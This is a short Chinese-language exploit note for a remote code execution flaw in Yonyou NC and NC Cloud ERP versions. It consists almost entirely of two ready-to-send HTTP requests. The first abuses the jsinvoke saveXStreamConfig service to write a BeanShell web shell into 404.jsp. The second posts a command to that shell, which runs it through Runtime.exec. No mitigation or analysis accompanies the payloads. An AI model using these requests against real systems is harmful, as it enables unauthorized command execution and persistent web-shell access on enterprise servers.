## 用友nc-cloud RCE
```
漏洞影响
NC63、NC633、NC65
NC Cloud1903、NC Cloud1909
NC Cloud2005、NC Cloud2105、NC Cloud2111
YonBIP高级版2207

先发送数据包，返回200

POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: 127.0.0.1:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cookiets=168170496; JSESSIONID=33A343770FF.server
If-None-Match: W/"1571-1589211696000"
If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 249

{"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/404.jsp"]}

再发送数据包执行命令，返回命令执行结果

POST /404.jsp?error=bsh.Interpreter HTTP/1.1
Host: 127.0.0.1:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cookiets=1681785232226; JSESSIONID=334D3ED07A343770FF.server
If-None-Match: W/"1571-1589211696000"
If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 104

cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ping 8.8.8.8").getInputStream())

```
